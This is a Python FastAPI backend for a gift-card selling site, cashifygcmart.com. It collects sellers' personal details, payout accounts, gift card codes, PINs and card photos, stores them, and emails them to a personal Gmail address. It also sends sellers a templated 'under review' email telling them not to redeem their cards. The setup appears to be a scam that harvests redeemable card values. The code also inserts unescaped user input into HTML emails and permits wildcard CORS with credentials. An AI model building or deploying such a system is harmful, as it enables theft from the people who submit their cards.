from fastapi import FastAPI, APIRouter
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel
from typing import List, Optional
from datetime import datetime
import random
import httpx
import json


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# Define Models
class StatusCheck(BaseModel):
    message: str = "API is working"

class GiftCardSubmission(BaseModel):
    # Personal Information
    firstName: str
    lastName: str
    email: str
    phoneNumber: Optional[str] = ""
    
    # Gift Card Details (simplified for now - you can expand this)
    cards: List[dict]
    
    # Payment Information
    paymentMethod: str
    paypalAddress: Optional[str] = ""
    zelleDetails: Optional[str] = ""
    cashAppTag: Optional[str] = ""
    btcAddress: Optional[str] = ""
    chimeDetails: Optional[str] = ""

# Email Template Functions
def generate_confirmation_email_html(customer_name, reference_number):
    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Card Submission Confirmation</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }}
        .email-container {{
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }}
        .header {{
            background: linear-gradient(135deg, #ec4899 0%, #f43f5e 100%);
            color: white;
            padding: 30px 20px;
            text-align: center;
        }}
        .header h1 {{
            margin: 0;
            font-size: 26px;
            font-weight: 600;
        }}
        .content {{
            padding: 30px;
        }}
        .reference-number {{
            background-color: #f8fafc;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 25px;
            border-left: 4px solid #ec4899;
        }}
        .reference-number strong {{
            color: #ec4899;
            font-size: 18px;
        }}
        .section {{
            margin-bottom: 25px;
        }}
        .section-title {{
            color: #1e40af;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }}
        .important {{
            background-color: #fef2f2;
            border: 1px solid #fca5a5;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }}
        .important strong {{
            color: #dc2626;
        }}
        .signature {{
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e5e7eb;
        }}
        .contact-info {{
            background-color: #f0fdf4;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
        }}
        .footer {{
            background-color: #f9fafb;
            padding: 20px;
            text-align: center;
            color: #6b7280;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <div class="email-container">
        <div class="header">
            <h1>Thank You for Your Submission, {customer_name}</h1>
        </div>
        
        <div class="content">
            <div class="reference-number">
                <strong>Reference Number: {reference_number}</strong><br>
                <strong>Current Status: Under review</strong>
            </div>
            
            <p>Our operations team is now verifying the details you provided to ensure the card meets our acceptance and fraud-prevention standards. This helps us protect both buyers and sellers and ensures smooth, accurate payouts.</p>
            
            <div class="section">
                <h2 class="section-title">📌 Next Steps</h2>
                <ul>
                    <li><strong>Status update:</strong> You'll receive an email from support@cashifygcmart.com within 14 hours with the outcome or a request for additional information.</li>
                    <li><strong>If approved:</strong> We'll include redemption instructions and the expected payout timeline in the follow-up email.</li>
                    <li><strong>If we need more info:</strong> We'll contact you within 8 hours to request photos or clarifications — please reply promptly to avoid delays.</li>
                </ul>
            </div>
            
            <div class="important">
                <strong>Important:</strong> Please do not use or redeem the gift card while it's under review.
            </div>
            
            <div class="section">
                <h2 class="section-title">📝 Submission Guidelines & Processing</h2>
                <ul>
                    <li><strong>Eligible cards:</strong> Only cards listed in our Rate Calculator are accepted.</li>
                    <li><strong>Minimum value:</strong> $50 per card.</li>
                    <li><strong>Processing windows:</strong></li>
                    <ul>
                        <li>Submissions received after 8:00 PM EST will be processed the following business day.</li>
                        <li>Submissions received on Sundays will be processed on the next business day.</li>
                    </ul>
                    <li><strong>Processing time:</strong> Can vary depending on demand and the card type. The quoted timelines above are typical but not guaranteed.</li>
                    <li><strong>Unlisted cards:</strong> Please contact support before submitting if a card brand is not shown in the Rate Calculator.</li>
                </ul>
                
                <p><em>Disclaimer: cashifygcmart.com is not responsible for any balance discrepancies on cards not listed in our accepted inventory.</em></p>
            </div>
            
            <p>If you have questions or need to provide additional documentation, reply to this email or contact us at support@cashifygcmart.com. Please include your reference number <strong>{reference_number}</strong> in all correspondence for fastest service.</p>
            
            <p>Thank you for choosing cashifygcmart.com.</p>
            
            <div class="signature">
                <p>Best regards,<br>
                <strong>Robert Smith</strong><br>
                Customer Support Manager</p>
                
                <div class="contact-info">
                    <p>📧 support@cashifygcmart.com</p>
                    <p>🌐 https://www.cashifygcmart.com</p>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>&copy; 2025 Cashifygcmart. All rights reserved.</p>
            <p>Please add support@cashifygcmart.com to your contacts to ensure our emails reach your inbox.</p>
        </div>
    </div>
</body>
</html>
    """

# Generate unique reference number
def generate_reference_number():
    timestamp = datetime.now().strftime("%H%M%S")
    random_num = random.randint(10, 99)
    return f"GC-{timestamp}-{random_num}"

# Resend email sending function for customer confirmation
async def send_confirmation_email(email: str, customer_name: str, reference_number: str):
    try:
        # Get Resend API key from environment
        resend_api_key = os.environ.get('RESEND_API_KEY')
        if not resend_api_key:
            print("ERROR: RESEND_API_KEY not found in environment variables")
            return False
        
        # Generate email content
        email_html = generate_confirmation_email_html(customer_name, reference_number)
        subject = f"Gift Card Submission Confirmation - Reference #{reference_number}"
        
        # Prepare Resend API payload
        payload = {
            "from": "support@cashifygcmart.com",
            "to": [email],
            "subject": subject,
            "html": email_html
        }
        
        # Send email via Resend API
        async with httpx.AsyncClient() as client:
            response = await client.post(
                "https://api.resend.com/emails",
                headers={
                    "Authorization": f"Bearer {resend_api_key}",
                    "Content-Type": "application/json"
                },
                json=payload
            )
        
        if response.status_code == 200:
            print(f"✅ Customer confirmation email sent to: {email}")
            print(f"Resend Response Status: {response.status_code}")
            print(f"Reference Number: {reference_number}")
            return True
        else:
            print(f"❌ Resend API error: {response.status_code} - {response.text}")
            return False
        
    except Exception as e:
        print(f"❌ Resend email sending failed: {e}")
        return False

# Internal notification email template for operations team with images
def generate_internal_notification_email(customer_name, reference_number, submission_data):
    cards_info = ""
    total_value = 0
    
    for i, card in enumerate(submission_data.get('cards', []), 1):
        card_value = float(card.get('value', 0)) if card.get('value', '').replace('.', '').isdigit() else 0
        total_value += card_value
        
        # Image status indicators
        front_img_status = "✅ Uploaded" if card.get('frontImage') else "❌ Missing"
        back_img_status = "✅ Uploaded" if card.get('backImage') else "❌ Missing"
        receipt_img_status = "✅ Uploaded" if card.get('receiptImage') else "❌ Not Required" if card.get('hasReceipt') == 'no' else "❌ Missing"
        digital_code = card.get('digitalCode', 'N/A') if card.get('cardType') == 'digital' else 'N/A'
        digital_pin = card.get('digitalPin', 'N/A') if card.get('cardType') == 'digital' else 'N/A'
        
        cards_info += f"""
        <tr style="border-bottom: 1px solid #e5e7eb;">
            <td style="padding: 12px; text-align: left; font-weight: bold;">{i}</td>
            <td style="padding: 12px; text-align: left;"><strong>{card.get('brand', 'N/A')}</strong></td>
            <td style="padding: 12px; text-align: left;"><strong>${card.get('value', '0')}</strong></td>
            <td style="padding: 12px; text-align: left;">{card.get('condition', 'N/A').replace('-', ' ').title()}</td>
            <td style="padding: 12px; text-align: left;">{"✅ Yes" if card.get('hasReceipt') == 'yes' else "❌ No"}</td>
            <td style="padding: 12px; text-align: left;">{card.get('cardType', 'N/A').title()}</td>
        </tr>
        <tr style="background-color: #f8fafc;">
            <td colspan="2" style="padding: 8px 12px; font-size: 12px;"><strong>Images:</strong></td>
            <td style="padding: 8px 12px; font-size: 12px;">Front: {front_img_status}</td>
            <td style="padding: 8px 12px; font-size: 12px;">Back: {back_img_status}</td>
            <td style="padding: 8px 12px; font-size: 12px;">Receipt: {receipt_img_status}</td>
            <td style="padding: 8px 12px; font-size: 12px;"></td>
        </tr>
        {"" if card.get('cardType') != 'digital' else f'''
        <tr style="background-color: #ecfef5;">
            <td colspan="3" style="padding: 8px 12px; font-size: 12px;"><strong>Digital Code:</strong> {digital_code}</td>
            <td colspan="3" style="padding: 8px 12px; font-size: 12px;"><strong>Digital PIN:</strong> {digital_pin}</td>
        </tr>
        '''}"""
    
    # Payment method details
    payment_details = ""
    payment_method = submission_data.get('paymentMethod', '').upper()
    if payment_method == 'PAYPAL':
        payment_details = f"PayPal Address: {submission_data.get('paypalAddress', 'Not provided')}"
    elif payment_method == 'ZELLE':
        payment_details = f"Zelle Details: {submission_data.get('zelleDetails', 'Not provided')}"
    elif payment_method == 'CASHAPP':
        payment_details = f"Cash App Tag: {submission_data.get('cashAppTag', 'Not provided')}"
    elif payment_method == 'BTC':
        payment_details = f"Bitcoin Address: {submission_data.get('btcAddress', 'Not provided')}"
    elif payment_method == 'CHIME':
        payment_details = f"Chime Details: {submission_data.get('chimeDetails', 'Not provided')}"
    
    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New Gift Card Submission - {reference_number}</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }}
        .email-container {{
            max-width: 900px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }}
        .header {{
            background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
            color: white;
            padding: 25px 20px;
            text-align: center;
        }}
        .header h1 {{
            margin: 0;
            font-size: 24px;
            font-weight: 600;
        }}
        .content {{
            padding: 25px;
        }}
        .reference-number {{
            background-color: #fee2e2;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #dc2626;
            text-align: center;
        }}
        .reference-number strong {{
            color: #dc2626;
            font-size: 18px;
        }}
        .section {{
            margin-bottom: 25px;
        }}
        .section-title {{
            color: #1e40af;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            background-color: #f0f9ff;
            padding: 8px 12px;
            border-radius: 6px;
        }}
        .customer-info {{
            background-color: #f8fafc;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
        }}
        .customer-info table {{
            width: 100%;
            border-collapse: collapse;
        }}
        .customer-info td {{
            padding: 6px 12px;
            border-bottom: 1px solid #e5e7eb;
            font-size: 14px;
        }}
        .customer-info td:first-child {{
            font-weight: 600;
            width: 25%;
            color: #374151;
        }}
        .cards-table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            overflow: hidden;
            font-size: 13px;
        }}
        .cards-table th {{
            background-color: #1f2937;
            color: white;
            padding: 10px 8px;
            text-align: left;
            font-weight: 600;
            font-size: 12px;
        }}
        .urgent {{
            background-color: #fef2f2;
            border: 2px solid #fca5a5;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }}
        .urgent strong {{
            color: #dc2626;
        }}
        .total-value {{
            background-color: #ecfdf5;
            border: 2px solid #a3e635;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin: 15px 0;
        }}
        .total-value strong {{
            color: #166534;
            font-size: 18px;
        }}
        .actions {{
            background-color: #fffbeb;
            border: 1px solid #fbbf24;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }}
        .footer {{
            background-color: #f9fafb;
            padding: 15px;
            text-align: center;
            color: #6b7280;
            font-size: 12px;
        }}
    </style>
</head>
<body>
    <div class="email-container">
        <div class="header">
            <h1>🚨 NEW GIFT CARD SUBMISSION RECEIVED</h1>
        </div>
        
        <div class="content">
            <div class="reference-number">
                <strong>Reference Number: {reference_number}</strong><br>
                <span style="font-size: 12px; color: #6b7280;">Submitted: {submission_data.get('submitted_at', 'Just Now')}</span>
            </div>
            
            <div class="urgent">
                <strong>⏰ IMMEDIATE ACTION REQUIRED:</strong> New submission requires verification and response within 14 hours per customer promise.
            </div>
            
            <div class="section">
                <h2 class="section-title">👤 CUSTOMER INFORMATION</h2>
                <div class="customer-info">
                    <table>
                        <tr>
                            <td><strong>Full Name:</strong></td>
                            <td><strong>{customer_name}</strong></td>
                        </tr>
                        <tr>
                            <td><strong>Email Address:</strong></td>
                            <td><a href="mailto:{submission_data.get('email')}" style="color: #3b82f6;">{submission_data.get('email')}</a></td>
                        </tr>
                        <tr>
                            <td><strong>Phone Number:</strong></td>
                            <td>{submission_data.get('phoneNumber', 'Not provided')}</td>
                        </tr>
                        <tr>
                            <td><strong>Payment Method:</strong></td>
                            <td><strong>{payment_method}</strong></td>
                        </tr>
                        <tr>
                            <td><strong>Payment Details:</strong></td>
                            <td>{payment_details}</td>
                        </tr>
                    </table>
                </div>
            </div>
            
            <div class="section">
                <h2 class="section-title">💳 GIFT CARD SUBMISSION DETAILS</h2>
                <table class="cards-table">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Brand</th>
                            <th>Value</th>
                            <th>Condition</th>
                            <th>Receipt</th>
                            <th>Type</th>
                        </tr>
                    </thead>
                    <tbody>
                        {cards_info}
                    </tbody>
                </table>
            </div>
            
            <div class="total-value">
                <strong>💰 TOTAL SUBMISSION VALUE: ${total_value:.2f}</strong>
            </div>
            
            <div class="actions">
                <h3 style="margin: 0 0 10px 0; color: #92400e;">📋 REQUIRED ACTIONS:</h3>
                <ol style="margin: 0; padding-left: 20px; color: #92400e;">
                    <li><strong>Verify Images:</strong> Check all uploaded card images and receipts</li>
                    <li><strong>Validate Details:</strong> Confirm card brands, values, and conditions</li>
                    <li><strong>Process Payment Info:</strong> Verify {payment_method} details</li>
                    <li><strong>Calculate Rates:</strong> Apply current rates for approval/offer</li>
                    <li><strong>Respond to Customer:</strong> Email {submission_data.get('email')} within 14 hours</li>
                </ol>
            </div>
            
            <div style="background-color: #f0fdf4; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; color: #166534;">
                <strong>Customer Reference Number: {reference_number}</strong><br>
                Customer confirmation email automatically sent to: {submission_data.get('email')}
            </div>
            
            <div style="margin-top: 20px; padding: 15px; background-color: #fee2e2; border-radius: 8px; border-left: 4px solid #dc2626;">
                <strong style="color: #dc2626;">⚠️ IMPORTANT:</strong> All uploaded images are attached to this email. Customer has been instructed not to use the gift card during review period.
            </div>
        </div>
        
        <div class="footer">
            <p><strong>Cashifygcmart Operations Alert</strong></p>
            <p>This is an automated notification. Customer awaiting response within 14 hours.</p>
            <p>Forward to: marketingmanager3059@gmail.com</p>
        </div>
    </div>
</body>
</html>
    """

# Resend email sending function for internal notifications with attachments
async def send_internal_notification_email(submission_data: dict, customer_name: str, reference_number: str):
    try:
        # Get Resend API key from environment
        resend_api_key = os.environ.get('RESEND_API_KEY')
        if not resend_api_key:
            print("ERROR: RESEND_API_KEY not found in environment variables")
            return False
        
        # Internal email settings - delivery address
        operations_email = "marketingmanager3059@gmail.com"
        
        # Calculate total value for subject line
        total_value = sum([float(card.get('value', 0)) if card.get('value', '').replace('.', '').isdigit() else 0 
                          for card in submission_data.get('cards', [])])
        
        # Generate email content
        email_html = generate_internal_notification_email(customer_name, reference_number, submission_data)
        subject = f"🚨 NEW SUBMISSION: {reference_number} - {customer_name} (${total_value:.2f})"
        
        # Prepare Resend API payload
        payload = {
            "from": "support@cashifygcmart.com",
            "to": [operations_email],
            "subject": subject,
            "html": email_html,
            "attachments": []
        }
        
        # Process file attachments from uploaded images
        attachment_count = 0
        for i, card in enumerate(submission_data.get('cards', []), 1):
            # Handle front image
            if card.get('frontImage') and isinstance(card['frontImage'], dict):
                if 'data' in card['frontImage'] and 'name' in card['frontImage']:
                    try:
                        # Decode base64 image data
                        image_data = card['frontImage']['data']
                        if image_data.startswith('data:'):
                            # Remove data URL prefix
                            image_data = image_data.split(',')[1]
                        
                        attachment = {
                            "filename": f"Card_{i}_Front_{card['frontImage']['name']}",
                            "content": image_data,
                            "content_type": card['frontImage'].get('type', 'image/jpeg')
                        }
                        payload["attachments"].append(attachment)
                        attachment_count += 1
                    except Exception as e:
                        print(f"Failed to attach front image for card {i}: {e}")
            
            # Handle back image
            if card.get('backImage') and isinstance(card['backImage'], dict):
                if 'data' in card['backImage'] and 'name' in card['backImage']:
                    try:
                        image_data = card['backImage']['data']
                        if image_data.startswith('data:'):
                            image_data = image_data.split(',')[1]
                        
                        attachment = {
                            "filename": f"Card_{i}_Back_{card['backImage']['name']}",
                            "content": image_data,
                            "content_type": card['backImage'].get('type', 'image/jpeg')
                        }
                        payload["attachments"].append(attachment)
                        attachment_count += 1
                    except Exception as e:
                        print(f"Failed to attach back image for card {i}: {e}")
            
            # Handle receipt image
            if card.get('receiptImage') and isinstance(card['receiptImage'], dict):
                if 'data' in card['receiptImage'] and 'name' in card['receiptImage']:
                    try:
                        image_data = card['receiptImage']['data']
                        if image_data.startswith('data:'):
                            image_data = image_data.split(',')[1]
                        
                        attachment = {
                            "filename": f"Card_{i}_Receipt_{card['receiptImage']['name']}",
                            "content": image_data,
                            "content_type": card['receiptImage'].get('type', 'image/jpeg')
                        }
                        payload["attachments"].append(attachment)
                        attachment_count += 1
                    except Exception as e:
                        print(f"Failed to attach receipt image for card {i}: {e}")
        
        # Send email via Resend API
        async with httpx.AsyncClient() as client:
            response = await client.post(
                "https://api.resend.com/emails",
                headers={
                    "Authorization": f"Bearer {resend_api_key}",
                    "Content-Type": "application/json"
                },
                json=payload
            )
        
        if response.status_code == 200:
            print(f"✅ Internal notification email sent to: {operations_email}")
            print(f"Resend Response Status: {response.status_code}")
            print(f"New submission from: {customer_name}")
            print(f"Reference Number: {reference_number}")
            print(f"Customer Email: {submission_data.get('email')}")
            print(f"Cards Count: {len(submission_data.get('cards', []))}")
            print(f"Attachments: {attachment_count} files attached")
            return True
        else:
            print(f"❌ Resend API error: {response.status_code} - {response.text}")
            return False
        
    except Exception as e:
        print(f"❌ Resend internal notification failed: {e}")
        return False

# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "Hello World"}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check():
    status_obj = StatusCheck()
    _ = await db.status_checks.insert_one(status_obj.dict())
    return status_obj

@api_router.post("/submit-gift-card")
async def submit_gift_card(submission: GiftCardSubmission):
    try:
        # Generate unique reference number
        reference_number = generate_reference_number()
        
        # Add metadata to submission
        submission_data = submission.dict()
        submission_data["reference_number"] = reference_number
        submission_data["status"] = "under_review"
        submission_data["submitted_at"] = datetime.now().isoformat()
        
        # Save to database
        await db.gift_card_submissions.insert_one(submission_data)
        
        # Send emails
        customer_name = f"{submission.firstName} {submission.lastName}"
        
        # 1. Send customer confirmation email
        customer_email_sent = await send_confirmation_email(
            submission.email, 
            customer_name, 
            reference_number
        )
        
        # 2. Send internal notification email to operations team
        internal_email_sent = await send_internal_notification_email(
            submission_data,
            customer_name, 
            reference_number
        )
        
        return {
            "success": True,
            "reference_number": reference_number,
            "message": "Gift card submission received successfully",
            "customer_email_sent": customer_email_sent,
            "internal_email_sent": internal_email_sent
        }
        
    except Exception as e:
        logging.error(f"Gift card submission error: {e}")
        return {
            "success": False,
            "message": "An error occurred while processing your submission"
        }

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
